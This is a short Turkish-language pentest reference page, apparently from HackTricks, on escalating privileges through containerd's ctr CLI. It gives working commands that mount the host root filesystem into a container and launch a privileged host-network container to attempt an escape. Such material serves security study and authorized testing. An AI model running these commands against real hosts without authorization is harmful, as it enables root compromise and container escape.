# Containerd (ctr) Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Temel bilgiler

**containerd** ve **ctr**'nin **container stack** içinde nerede konumlandığını öğrenmek için aşağıdaki bağlantıya gidin:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Bir host'un containerd ile birlikte gelen native CLI olan `ctr` komutunu içerdiğini tespit ederseniz:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
containerd tarafından bilinen image'ları listeleyebilirsiniz:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Ardından **host root'un container root'una recursive olarak bind-mounted edildiği image'lardan birini çalıştırın**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Privileged mode'da bir container çalıştırın ve escape için test edin.\
Host networking kullanarak privileged bir container'ı şu şekilde çalıştırabilirsiniz:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged`, çağıranın etkin Linux capabilities değerlerini prosese verir ve çeşitli izolasyon kontrollerini kaldırır; ancak escape işlemi ortamın yapılandırmasına bağlı olarak mümkün olabilir. Bunu test etmek için aşağıdaki sayfada belirtilen teknikleri kullanın:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [containerd ile çalışmaya başlama](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [`ctr image` komutunun implementasyonu](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [`ctr run` komutunun implementasyonu](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Linux kernel shared-subtree documentation](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [containerd OCI package: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [containerd `ctr` komut bayrakları](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
